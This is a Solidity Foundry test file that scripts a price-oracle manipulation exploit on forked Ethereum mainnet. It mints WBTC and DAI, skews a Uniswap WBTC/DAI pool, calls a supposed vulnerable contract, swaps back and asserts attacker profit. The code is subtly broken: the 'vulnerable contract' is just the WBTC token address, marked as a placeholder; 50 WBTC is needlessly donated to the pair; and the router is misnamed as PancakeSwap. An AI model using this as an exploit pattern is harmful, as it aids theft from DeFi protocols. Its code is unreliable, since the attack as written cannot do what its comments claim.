// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IDDSContract {
    function executeExploitableFunction() external;
    function getPriceByWBTCDAI() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);
    IERC20 public wbtc;
    IERC20 public dai;
    address public uniswapPair;
    IPancakeRouter public router;
    IDDSContract public vulnerableContract;
    uint256 public initialWBTC;
    uint256 public initialDAI;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY", 18000000);
        wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        // Uniswap V2 WBTC/DAI pair
        uniswapPair = 0x231B7589426Ffe1b75405526fC32aC09D44364c4;
        // Uniswap V2 Router
        router = IPancakeRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        // Vulnerable contract - using TARGET as placeholder
        vulnerableContract = IDDSContract(TARGET);
        // Initial balances
        initialWBTC = wbtc.balanceOf(address(this));
        initialDAI = dai.balanceOf(address(this));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        // Step 1: Inject tokens for manipulation
        deal(address(wbtc), address(this), 100 * 1e8); // 100 WBTC (8 decimals)
        deal(address(dai), address(this), 5_000_000 * 1e18); // 5M DAI (18 decimals)

        // Step 2: Approve tokens for Uniswap router
        wbtc.approve(address(router), type(uint256).max);
        dai.approve(address(router), type(uint256).max);

        // Step 3: Record initial state
        uint256 balanceBefore = wbtc.balanceOf(address(this));

        // Step 4: Manipulate Uniswap pool price - dump WBTC for DAI to skew ratio
        // This makes WBTC appear cheaper in the oracle
        wbtc.transfer(address(uniswapPair), 50 * 1e8);
        IERC20(uniswapPair).approve(address(router), type(uint256).max);

        // Step 5: Execute swap to manipulate price (sell WBTC, buy DAI)
        address[] memory path = new address[](2);
        path[0] = address(wbtc);
        path[1] = address(dai);
        router.swapExactTokensForTokens(50 * 1e8, 0, path, address(this), block.timestamp + 1000);

        // Step 6: Call vulnerable contract function that uses manipulated oracle price
        // This should give attacker favorable terms due to skewed WBTC/DAI price
        vulnerableContract.executeExploitableFunction();

        // Step 7: Reverse manipulation - buy back WBTC with DAI
        path[0] = address(dai);
        path[1] = address(wbtc);
        uint256 daiBalance = dai.balanceOf(address(this));
        dai.approve(address(router), daiBalance);
        router.swapExactTokensForTokens(daiBalance, 0, path, address(this), block.timestamp + 1000);

        // Step 8: Verify profit
        uint256 balanceAfter = wbtc.balanceOf(address(this));
        assertGt(balanceAfter, balanceBefore, "Attacker should profit from oracle manipulation");
        uint256 finalBalance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
    fallback() external payable {}
}

